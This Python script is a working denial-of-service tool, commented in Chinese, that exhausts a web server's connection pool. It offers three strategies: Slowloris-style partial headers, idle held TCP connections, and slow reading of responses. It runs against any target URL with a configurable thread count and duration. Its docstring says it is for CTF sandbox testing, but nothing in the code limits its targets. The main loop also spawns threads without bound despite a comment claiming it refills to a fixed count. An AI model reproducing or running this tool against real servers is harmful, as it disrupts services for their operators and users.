#!/usr/bin/env python3
"""
连接池耗尽攻击脚本
通过创建大量连接并长时间占用来耗尽目标服务器的连接池。

支持三种策略：
  1. slow-headers — Slowloris 风格：发送不完整的 HTTP 头部，定期追加保持连接
  2. connection-hold — 建立 TCP 连接后不发送任何数据，仅占用连接槽位
  3. slow-read — 发送完整请求后以极慢速度读取响应，占用连接

所有策略均用于 CTF 沙盒测试环境。
"""

import argparse
import socket
import ssl
import sys
import time
import threading
import random
from urllib.parse import urlparse


# ================== 连接创建 ==================

def create_socket(host: str, port: int, use_ssl: bool, timeout: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
    if use_ssl:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(sock, server_hostname=host)
    return sock


# ================== 策略实现 ==================

def attack_slow_headers(host: str, port: int, use_ssl: bool, timeout: int,
                        stop_event: threading.Event, verbose: bool):
    """发送不完整 HTTP header，定期追加字符保持连接"""
    sock = None
    try:
        sock = create_socket(host, port, use_ssl, timeout)
        request = (
            f"GET /{random.randint(0, 99999)} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (CTF-SlowHeaders)\r\n"
            f"Accept: text/html,application/xhtml+xml,*/*\r\n"
        )
        sock.send(request.encode())

        count = 0
        while not stop_event.is_set():
            stop_event.wait(random.uniform(3, 15))
            if stop_event.is_set():
                break
            header = f"X-Slow-{count}: {random.randint(0, 999999999)}\r\n"
            try:
                sock.send(header.encode())
                count += 1
                if verbose:
                    print(f"[+] slow-headers: 发送第 {count} 个追加 header")
            except (socket.timeout, ConnectionError, OSError):
                break
    except Exception:
        pass
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


def attack_connection_hold(host: str, port: int, use_ssl: bool, timeout: int,
                           stop_event: threading.Event, verbose: bool):
    """仅建立 TCP 连接不发送数据，占用连接槽"""
    sock = None
    try:
        sock = create_socket(host, port, use_ssl, timeout)
        if verbose:
            print("[+] connection-hold: TCP 连接建立")
        while not stop_event.is_set():
            try:
                sock.settimeout(5)
                data = sock.recv(1)
                if not data:
                    break
            except socket.timeout:
                continue
            except Exception:
                break
    except Exception:
        pass
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


def attack_slow_read(host: str, port: int, use_ssl: bool, timeout: int,
                     stop_event: threading.Event, verbose: bool):
    """发送完整请求后以极慢速度读取响应"""
    sock = None
    try:
        sock = create_socket(host, port, use_ssl, timeout)
        request = (
            f"GET /?cache_bust={random.randint(0, 999999)} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (CTF-SlowRead)\r\n"
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        sock.send(request.encode())
        if verbose:
            print("[+] slow-read: 请求已发送，缓慢读取...")

        while not stop_event.is_set():
            sock.settimeout(15)
            try:
                data = sock.recv(1)
                if not data:
                    break
                stop_event.wait(random.uniform(1, 5))
            except socket.timeout:
                continue
            except Exception:
                break
    except Exception:
        pass
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


STRATEGIES = {
    "slow-headers": attack_slow_headers,
    "connection-hold": attack_connection_hold,
    "slow-read": attack_slow_read,
}


# ================== 参数解析 ==================

def parse_args():
    parser = argparse.ArgumentParser(
        description="连接池耗尽攻击 — 通过大量慢连接占用服务器连接池",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
策略说明：
  slow-headers      发送不完整 HTTP 头部，定期追加 header 保持连接
  connection-hold   仅建立 TCP 连接不发送数据，占用连接槽
  slow-read         发送完整请求后以极慢速度读取响应

示例：
  python dos.py -t https://example.com -s slow-headers
  python dos.py -t http://example.com:8000 -s connection-hold -n 50
  python dos.py -t https://example.com -s slow-read -n 100 -D 60
        """,
    )

    parser.add_argument(
        "-t", "--target",
        dest="target",
        required=True,
        help="目标 URL，如 http://example.com 或 https://example.com:8443",
    )

    parser.add_argument(
        "-n", "--threads",
        dest="threads",
        type=int,
        default=20,
        help="并发线程数（默认: 20）",
    )

    parser.add_argument(
        "-s", "--strategy",
        dest="strategy",
        choices=list(STRATEGIES.keys()),
        default="slow-headers",
        help="攻击策略（默认: slow-headers）",
    )

    parser.add_argument(
        "-D", "--duration",
        dest="duration",
        type=int,
        default=0,
        help="攻击持续时间秒数（默认: 0 无限，Ctrl+C 停止）",
    )

    parser.add_argument(
        "--timeout",
        dest="timeout",
        type=int,
        default=10,
        help="socket 超时秒数（默认: 10）",
    )

    parser.add_argument(
        "-v", "--verbose",
        dest="verbose",
        action="store_true",
        help="详细输出模式",
    )

    return parser.parse_args()


def parse_target(raw: str):
    """解析目标 URL，返回 (host, port, use_ssl)"""
    if not raw.startswith("http"):
        raw = "http://" + raw
    parsed = urlparse(raw)
    host = parsed.hostname or "localhost"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    return host, port, parsed.scheme == "https"


# ================== 入口 ==================

def main():
    args = parse_args()
    host, port, use_ssl = parse_target(args.target)
    strategy_fn = STRATEGIES[args.strategy]
    stop_event = threading.Event()

    print(f"目标: {host}:{port}  |  SSL: {use_ssl}  |  策略: {args.strategy}")
    print(f"线程: {args.threads}  |  持续时间: {'无限' if args.duration == 0 else f'{args.duration}s'}  |  Ctrl+C 停止")
    print()

    count = 0
    start_time = time.time()

    try:
        while True:
            # 检查是否超时
            if args.duration > 0 and (time.time() - start_time) >= args.duration:
                print(f"持续时间 {args.duration}s 已达到，停止。")
                break

            # 如果存活线程数 < 目标数，补到目标数
            alive = 0  # 粗略计数，不精确追踪每个线程
            for _ in range(args.threads):
                t = threading.Thread(
                    target=strategy_fn,
                    args=(host, port, use_ssl, args.timeout, stop_event, args.verbose),
                    daemon=True,
                )
                t.start()
                count += 1

            if not args.verbose and count % (args.threads * 10) == 0:
                print(f"已创建 {count} 次连接...")

    except KeyboardInterrupt:
        print("\n收到中断信号，停止...")
    finally:
        stop_event.set()
        print(f"总共发起 {count} 次连接。")


if __name__ == "__main__":
    main()
